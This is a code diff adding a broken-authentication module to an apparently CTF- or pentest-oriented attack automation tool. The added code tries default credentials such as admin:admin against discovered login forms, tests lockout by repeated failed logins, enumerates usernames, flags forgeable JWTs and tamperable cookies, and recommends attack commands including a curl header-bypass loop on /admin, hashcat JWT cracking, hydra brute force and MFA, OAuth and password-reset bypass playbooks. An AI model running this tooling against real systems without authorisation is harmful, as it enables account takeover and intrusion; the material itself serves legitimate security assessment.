@@ -1754,6 +1754,7 @@ class LootTracker:
         self.notes = []
         self.recommend = []       # ready-to-run commands for gated/manual follow-up
         self.usernames = []       # harvested usernames/emails -> seed brute lists
+        self.auth_findings = []   # broken-auth / session / cookie / JWT findings
         self.valid_creds = []     # verified working credentials (dicts)
         self.candidate_creds = [] # found-but-unverified credentials (dicts)
         self.chain = []           # ordered kill-chain narrative steps
@@ -1832,7 +1833,7 @@ class LootTracker:
     def write(self, outfile):
         """Write loot report."""
         lines = ["# Loot Report\n"]
-        for cat in ['creds', 'usernames', 'keys', 'flags', 'shares', 'urls', 'files', 'notes', 'recommend']:
+        for cat in ['creds', 'usernames', 'keys', 'auth_findings', 'flags', 'shares', 'urls', 'files', 'notes', 'recommend']:
             items = getattr(self, cat)
             if items:
                 lines.append(f"\n## {cat.upper()}")
@@ -3434,6 +3435,329 @@ def run_share_mining(target, services, outdir, args, tools, loot=None):
     return vulns
 
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# BROKEN AUTHENTICATION / SESSION / AUTH-LOGIC  (OWASP WSTG-ATHN + WSTG-SESS)
+# ------------------------------------------------------------------------
+# Tier 1 passive analysis runs by default; Tier 2 active probes are --active-
+# gated (else _recommend); Tier 3 logic flaws are detect-surface + recommend.
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+_JWT_RE = re.compile(r'eyJ[A-Za-z0-9_-]{6,}\.eyJ[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*')
+_SESSION_COOKIE_HINTS = ('sess', 'sid', 'phpsessid', 'jsessionid', 'asp.net', 'auth',
+                         'token', 'jwt', 'remember', 'login', 'csrf')
+_ROLE_WORDS = ('role', 'admin', 'is_admin', 'isadmin', 'user', 'usertype', 'level',
+               'priv', 'group', 'superuser', 'account', 'access')
+_URL_SESSION_PARAMS = ('sessionid', 'session', 'sid', 'phpsessid', 'jsessionid',
+                       'token', 'access_token', 'auth', 'sessid', 'jwt')
+
+
+def _b64url_decode(seg):
+    seg += '=' * (-len(seg) % 4)
+    import base64
+    return base64.urlsafe_b64decode(seg.encode()).decode('utf-8', 'ignore')
+
+
+def _cookie_tamper_reason(name, value):
+    """Heuristic: does this cookie look client-tamperable for privilege/session?"""
+    v = value.strip('"')
+    low = v.lower()
+    # literal role assignment (e.g. admin=0, role=user, isAdmin=false)
+    if re.fullmatch(r'(true|false|0|1|user|admin|guest|yes|no)', low):
+        return f"plaintext value '{v}' (flip to escalate)"
+    # base64 that decodes to JSON / role words
+    if re.fullmatch(r'[A-Za-z0-9+/_-]{8,}={0,2}', v):
+        try:
+            dec = _b64url_decode(v.split('.')[0]) if '.' not in v else ''
+            if not dec:
+                import base64
+                dec = base64.b64decode(v + '=' * (-len(v) % 4)).decode('utf-8', 'ignore')
+            if dec and (dec.strip().startswith(('{', '[')) or
+                        any(w in dec.lower() for w in _ROLE_WORDS)):
+                return f"base64 decodes to tamperable data: {dec[:80]}"
+        except Exception:
+            pass
+    # short integer -> likely sequential user id
+    if re.fullmatch(r'\d{1,6}', v):
+        return f"numeric value '{v}' (likely sequential id — try incrementing)"
+    return None
+
+
+def analyze_cookies(header_text, is_https, loot):
+    """WSTG-SESS-02: audit Set-Cookie flags + flag tamperable session/role cookies."""
+    vulns = []
+    for line in header_text.splitlines():
+        if not line.lower().startswith('set-cookie:'):
+            continue
+        cookie = line.split(':', 1)[1].strip()
+        nv = cookie.split(';', 1)[0]
+        name = nv.split('=', 1)[0].strip()
+        value = nv.split('=', 1)[1] if '=' in nv else ''
+        attrs = cookie.lower()
+        sess = any(h in name.lower() for h in _SESSION_COOKIE_HINTS)
+        missing = []
+        if sess and 'httponly' not in attrs:
+            missing.append('HttpOnly')
+        if sess and is_https and 'secure' not in attrs:
+            missing.append('Secure')
+        if sess and 'samesite' not in attrs:
+            missing.append('SameSite')
+        if missing:
+            desc = f"Cookie '{name}' missing {', '.join(missing)}"
+            if loot:
+                loot.add('auth_findings', desc)
+            vulns.append({'port': 0, 'service': 'http', 'product': 'session', 'version': '',
+                         'desc': desc, 'cve': '',
+                         'exploit': 'XSS/session theft risk (WSTG-SESS-02)', 'severity': 'medium'})
+        reason = _cookie_tamper_reason(name, value)
+        if reason:
+            desc = f"Tamperable cookie '{name}': {reason}"
+            if loot:
+                loot.add('auth_findings', desc)
+                loot.add_step(f"Auth: tamper cookie '{name}' -> {reason}")
+            vulns.append({'port': 0, 'service': 'http', 'product': 'session', 'version': '',
+                         'desc': desc, 'cve': '',
+                         'exploit': f"resend request with modified '{name}' cookie",
+                         'severity': 'high'})
+    return vulns
+
+
+def decode_and_flag_jwt(token, source, loot):
+    """WSTG-SESS JWT: decode header/payload (stdlib) and flag alg:none, HS256
+    (alg-confusion / weak-secret crack), missing/long exp, sensitive claims."""
+    vulns = []
+    parts = token.split('.')
+    if len(parts) < 2:
+        return vulns
+    try:
+        header = json.loads(_b64url_decode(parts[0]))
+        payload = json.loads(_b64url_decode(parts[1])) if parts[1] else {}
+    except Exception:
+        return vulns
+    alg = str(header.get('alg', '')).lower()
+    if loot:
+        loot.add('keys', f"JWT ({source}): alg={header.get('alg')} claims={list(payload)[:8]}")
+    if alg in ('none', ''):
+        vulns.append({'port': 0, 'service': 'http', 'product': 'JWT', 'version': '',
+                     'desc': f'JWT accepts alg=none ({source}) — forge arbitrary tokens', 'cve': '',
+                     'exploit': "craft {\"alg\":\"none\"} JWT with desired claims, no signature",
+                     'severity': 'critical'})
+        if loot:
+            loot.add_step("Auth: forge alg:none JWT -> impersonate any user")
+    elif alg.startswith('hs'):
+        vulns.append({'port': 0, 'service': 'http', 'product': 'JWT', 'version': '',
+                     'desc': f'JWT uses {header.get("alg")} ({source}) — HMAC secret crackable / alg-confusion',
+                     'cve': '', 'exploit': f'hashcat -m 16500 <jwt> wordlist  (then re-sign)',
+                     'severity': 'medium'})
+    if 'exp' not in payload:
+        vulns.append({'port': 0, 'service': 'http', 'product': 'JWT', 'version': '',
+                     'desc': f'JWT has no exp claim ({source}) — token never expires', 'cve': '',
+                     'exploit': 'replay token indefinitely', 'severity': 'medium'})
+    if any(str(k).lower() in _ROLE_WORDS for k in payload):
+        if loot:
+            loot.add('auth_findings', f"JWT ({source}) carries role/privilege claims: "
+                     + ','.join(k for k in payload if str(k).lower() in _ROLE_WORDS))
+    return vulns
+
+
+def detect_auth_surface(base_url, body, corpus, loot):
+    """Find login form (action/method/fields/csrf) + auth-related endpoints."""
+    surface = {'login_form': None, 'endpoints': set(), 'has_2fa': False,
+               'has_oauth': False, 'has_reset': False}
+    # login form: a <form> containing an input[type=password]
+    for fm in re.finditer(r'<form\b[^>]*>(.*?)</form>', body or '', re.I | re.S):
+        block = fm.group(0)
+        if re.search(r'type=["\']?password', block, re.I):
+            action = (re.search(r'action=["\']([^"\']*)["\']', block, re.I) or [None, ''])[1]
+            method = (re.search(r'method=["\']([^"\']*)["\']', block, re.I) or [None, 'post'])[1]
+            names = re.findall(r'name=["\']([^"\']+)["\']', block, re.I)
+            pass_f = next((n for n in names if 'pass' in n.lower()), 'password')
+            user_f = next((n for n in names if any(u in n.lower() for u in
+                          ('user', 'email', 'login', 'name', 'uid'))), 'username')
+            csrf_f = next((n for n in names if any(c in n.lower() for c in
+                          ('csrf', 'token', '_token', 'authenticity'))), None)
+            surface['login_form'] = {'action': action or base_url, 'method': method.lower(),
+                                     'fields': names, 'user': user_f, 'pass': pass_f, 'csrf': csrf_f}
+            break
+    urls = list(corpus.get('urls', [])) + [base_url]
+    blob = ' '.join(urls) + ' ' + (body or '')[:5000]
+    for pat, key in ((r'(?i)/(login|signin|auth|session)', 'endpoints'),
+                     (r'(?i)/(register|signup)', 'endpoints'),
+                     (r'(?i)/(logout|signout)', 'endpoints')):
+        for m in re.finditer(pat, blob):
+            surface['endpoints'].add(m.group(0))
+    surface['has_2fa'] = bool(re.search(r'(?i)(2fa|mfa|otp|one[- ]time|verify.?code|totp|authenticator)', blob))
+    surface['has_oauth'] = bool(re.search(r'(?i)(/oauth|/authorize|client_id=|response_type=|/saml|/sso|redirect_uri=)', blob))
+    surface['has_reset'] = bool(re.search(r'(?i)(reset.?password|forgot.?password|/recover|reset.?token)', blob))
+    if loot and surface['login_form']:
+        loot.add('auth_findings', f"login form at {surface['login_form']['action']} "
+                 f"(user={surface['login_form']['user']}, csrf={'yes' if surface['login_form']['csrf'] else 'NO'})")
+    return surface
+
+
+class AuthProbe:
+    """Minimal curl-backed login-form client: submit creds, return a response
+    fingerprint (status, body length, location, elapsed) for diffing."""
+    def __init__(self, base_url, form):
+        from urllib.parse import urljoin
+        self.url = urljoin(base_url + '/', form['action']) if not form['action'].startswith('http') else form['action']
+        self.form = form
+
+    def attempt(self, user, pw):
+        data = []
+        for f in self.form['fields']:
+            if f == self.form['user']:
+                data += ['--data-urlencode', f'{f}={user}']
+            elif f == self.form['pass']:
+                data += ['--data-urlencode', f'{f}={pw}']
+            else:
+                data += ['--data-urlencode', f'{f}=x']
+        if self.form['user'] not in self.form['fields']:
+            data += ['--data-urlencode', f"{self.form['user']}={user}"]
+            data += ['--data-urlencode', f"{self.form['pass']}={pw}"]
+        t0 = time.time()
+        rc, out, _ = _run(['curl', '-sik', '-o', '-', '-w', '\\n__HTTP_%{http_code}__',
+                          '--max-time', '15'] + data + [self.url], timeout=20)
+        elapsed = time.time() - t0
+        code = (re.search(r'__HTTP_(\d+)__', out) or [None, '0'])[1]
+        loc = (re.search(r'(?im)^location:\s*(.+)$', out) or [None, ''])[1].strip()
+        setck = bool(re.search(r'(?im)^set-cookie:', out))
+        return {'code': code, 'len': len(out), 'loc': loc, 'setcookie': setck,
+                'elapsed': elapsed, 'body': out}
+
+
+_DEFAULT_LOGIN_CREDS = [('admin', 'admin'), ('admin', 'password'), ('admin', ''),
+                        ('administrator', 'administrator'), ('root', 'root'),
+                        ('admin', 'admin123'), ('test', 'test'), ('guest', 'guest')]
+
+
+def run_auth_suite(url, port, corpus, outdir, args, tools, loot=None):
+    """Broken-auth / session / auth-logic testing for one HTTP service.
+    Tier 1 passive (always) + Tier 2 active (gated) + Tier 3 recommend."""
+    vulns = []
+    if not shutil.which('curl'):
+        return vulns
+    is_https = url.lower().startswith('https')
+    _, resp, _ = _run(['curl', '-sik', '-L', '--max-time', '12', url], timeout=15)
+    head, _, body = resp.partition('\r\n\r\n')
+    if not body:
+        head, _, body = resp.partition('\n\n')
+    body = body[:200000]
+    (outdir / f'auth_headers_{port}.txt').write_text(head[:20000])
+
+    # ── Tier 1: passive ──
+    vulns += analyze_cookies(head, is_https, loot)
+
+    seen_jwt = set()
+    for m in _JWT_RE.finditer(head + ' ' + body + ' ' + ' '.join(corpus.get('urls', []))):
+        tok = m.group(0)
+        if tok not in seen_jwt:
+            seen_jwt.add(tok)
+            vulns += decode_and_flag_jwt(tok, f'{url}', loot)
+
+    for u in corpus.get('urls', []):
+        q = u.split('?', 1)[1].lower() if '?' in u else ''
+        if any(f'{p}=' in q for p in _URL_SESSION_PARAMS):
+            if loot:
+                loot.add('auth_findings', f"session/token in URL (leaks via referrer/logs): {u}")
+            vulns.append({'port': port, 'service': 'http', 'product': 'session', 'version': '',
+                         'desc': 'Session identifier / token passed in URL (WSTG-SESS-04)', 'cve': '',
+                         'exploit': 'token leaks in Referer, history, proxy logs', 'severity': 'medium'})
+            break
+
+    if re.search(r'(?im)^www-authenticate:\s*basic', head) and not is_https:
+        vulns.append({'port': port, 'service': 'http', 'product': 'auth', 'version': '',
+                     'desc': 'HTTP Basic auth over cleartext HTTP (WSTG-ATHN-01)', 'cve': '',
+                     'exploit': 'credentials base64-only, sniffable', 'severity': 'high'})
+
+    surface = detect_auth_surface(url, body, corpus, loot)
+    lf = surface['login_form']
+    if lf:
+        if is_https and lf['action'].startswith('http://'):
+            vulns.append({'port': port, 'service': 'http', 'product': 'auth', 'version': '',
+                         'desc': 'Login form submits credentials over cleartext HTTP (WSTG-ATHN-01)',
+                         'cve': '', 'exploit': lf['action'], 'severity': 'high'})
+        if not lf['csrf']:
+            vulns.append({'port': port, 'service': 'http', 'product': 'auth', 'version': '',
+                         'desc': 'Login/state-changing form without anti-CSRF token (WSTG-SESS-05)',
+                         'cve': '', 'exploit': 'craft cross-site POST', 'severity': 'medium'})
+    if lf and 'no-store' not in head.lower():
+        if loot:
+            loot.add('auth_findings', 'auth page not marked Cache-Control: no-store (WSTG-ATHN-06)')
+
+    # ── Tier 2: active probes (gated) ──
+    if lf and not active_enabled(args):
+        _recommend(loot, f"hydra/AuthProbe default-creds + lockout test on {lf['action']}",
+                   "active auth probes (enable with --active)")
+    elif lf and active_enabled(args):
+        subsection("Broken-Auth Active Probes")
+        probe = AuthProbe(url, lf)
+        # baseline: a definitely-invalid login
+        base = probe.attempt('zz_nolock_%d' % (int(time.time()) % 100000), 'zWrongPw!123')
+        # default creds
+        ulist = getattr(args, 'userlist', None)
+        for u, p in _DEFAULT_LOGIN_CREDS:
+            r = probe.attempt(u, p)
+            if (r['loc'] and 'login' not in r['loc'].lower() and r['code'] in ('301', '302')) \
+               or (r['setcookie'] and abs(r['len'] - base['len']) > 80) \
+               or (r['code'] == '200' and abs(r['len'] - base['len']) > 200
+                   and not re.search(r'(?i)invalid|incorrect|failed|error', r['body'][:3000])):
+                good(f"  possible valid login: {u}:{p or '<blank>'}")
+                if loot:
+                    loot.add_cred(u, p, source='default-cred(form)', scope='web', verified=False)
+                    loot.add_step(f"Foothold: default web creds {u}:{p or '<blank>'}")
+                vulns.append({'port': port, 'service': 'http', 'product': 'login', 'version': '',
+                             'desc': f'Default/weak web credential accepted: {u}:{p or "<blank>"}',
+                             'cve': '', 'exploit': f'login at {lf["action"]} as {u}:{p}',
+                             'severity': 'high'})
+                break
+        # weak lockout: hammer a THROWAWAY user, look for lockout/rate-limit signal
+        throwaway = 'zz_nolock_%d' % (int(time.time()) % 100000)
+        locked = False
+        for _ in range(6):
+            r = probe.attempt(throwaway, 'x%d' % time.time())
+            if r['code'] in ('429',) or re.search(r'(?i)locked|too many|rate.?limit|captcha|try again later',
+                                                   r['body'][:3000]):
+                locked = True
+                break
+        if not locked:
+            vulns.append({'port': port, 'service': 'http', 'product': 'login', 'version': '',
+                         'desc': 'No account lockout / rate limiting on login (WSTG-ATHN-03)',
+                         'cve': '', 'exploit': f'hydra http-post-form on {lf["action"]}',
+                         'severity': 'medium'})
+        # username enumeration: candidate users vs the known-bad baseline
+        cands = list(dict.fromkeys(getattr(loot, 'usernames', [])))[:8] if loot else []
+        enum_hits = []
+        for cu in cands:
+            r = probe.attempt(cu, 'zWrongPw!123')
+            if abs(r['len'] - base['len']) > 120 or r['code'] != base['code'] \
+               or (r['elapsed'] - base['elapsed'] > 1.0):
+                enum_hits.append(cu)
+        if enum_hits:
+            if loot:
+                loot.add('auth_findings', f"username enumeration: {', '.join(enum_hits[:10])}")
+            vulns.append({'port': port, 'service': 'http', 'product': 'login', 'version': '',
+                         'desc': f'Username enumeration via login response diff ({len(enum_hits)} users)',
+                         'cve': '', 'exploit': 'valid usernames distinguishable', 'severity': 'low'})
+
+    # auth-schema bypass (403/401 header tricks) — gated active else recommend
+    if not active_enabled(args):
+        _recommend(loot, f"for h in X-Original-URL X-Rewrite-URL X-Forwarded-For; do "
+                   f"curl -sk -H \"$h: 127.0.0.1\" {url}/admin; done",
+                   "auth-schema bypass on 401/403 paths (WSTG-ATHN-04)")
+
+    # ── Tier 3: logic-flaw playbook (detect surface -> recommend) ──
+    if surface['has_2fa']:
+        _recommend(loot, f"MFA: step-skip to post-login URL; replay OTP; brute OTP (no rate limit); "
+                   f"check /api/me for backup codes", "2FA/MFA bypass playbook")
+    if surface['has_oauth']:
+        _recommend(loot, f"OAuth/SSO: tamper redirect_uri; drop/replay state (CSRF); token/audience "
+                   f"confusion; SAML signature strip/XSW", "OAuth/SSO auth-logic playbook")
+    if surface['has_reset']:
+        _recommend(loot, f"Reset: Host-header poison the reset link; test token predictability & "
+                   f"non-invalidation; reset without old password", "password-reset logic playbook")
+    return vulns
+
+
 def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None, hostnames=None):
     """Phase 5: Supplementary Tool Enumeration (vhosts, web, SMB, NFS, FTP, TLS, nuclei).
     Returns list of additional structured vuln findings discovered in phase 5."""
@@ -3698,6 +4022,8 @@ def phase5_tools(target, services, outdir, args, tools, api_key=None, loot=None,
         web_corpus['params'].update(pc['params'])
         # Web foothold heuristics: HTML-intel (passive) + default-cred/LFI/IDOR (gated)
         shellshock_vulns += run_web_foothold_suite(url, port, pc, outdir, args, tools, loot)
+        # Broken-auth / session / cookie / JWT testing (Tier1 passive, Tier2 gated, Tier3 recommend)
+        shellshock_vulns += run_auth_suite(url, port, pc, outdir, args, tools, loot)
 
     # ── Injection & SSRF testing (consume crawler corpus; active-gated) ──
     if web_corpus['params']:
@@ -4425,8 +4751,10 @@ def _chain_enablers(loot, vulns, services):
         out.append(f"Key/hash to crack: `{k}`")
     for v in vulns:
         d = v.get('desc', '').lower()
-        if any(x in d for x in ('anonymous', 'default-credential', 'local file inclusion',
-                                'credential reuse', 'user==pass', 'kerberoast', 'signing not required')):
+        if any(x in d for x in ('anonymous', 'default-credential', 'default/weak web credential',
+                                'local file inclusion', 'credential reuse', 'user==pass',
+                                'kerberoast', 'signing not required', 'alg=none', 'tamperable cookie',
+                                'no account lockout', 'basic auth over cleartext')):
             out.append(f"[{v.get('severity', '').upper()}] {v['desc']}")
     seen, uniq = set(), []
     for x in out:
@@ -4530,7 +4858,7 @@ def write_markdown_report(target, services, vulns, all_scripts, sploit_results,
 
     # Loot
     if loot:
-        loot_categories = ['creds', 'usernames', 'keys', 'flags', 'shares', 'urls', 'files', 'notes', 'recommend']
+        loot_categories = ['creds', 'usernames', 'keys', 'auth_findings', 'flags', 'shares', 'urls', 'files', 'notes', 'recommend']
         has_loot = any(getattr(loot, cat, []) for cat in loot_categories)
         if has_loot:
             lines.extend(['', '## Loot', ''])
